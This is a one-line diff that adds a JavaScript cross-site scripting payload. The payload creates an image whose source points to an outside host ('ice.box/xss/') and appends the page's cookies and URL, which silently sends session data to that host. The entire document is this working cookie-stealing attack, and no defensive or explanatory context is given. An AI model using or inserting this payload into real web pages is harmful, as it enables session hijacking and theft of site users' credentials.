@@ -1,0 +1,1 @@
+(new Image()).src = 'http://ice.box/xss/?xss=' + escape(document.cookie) + "    URL=" + escape(document.URL);
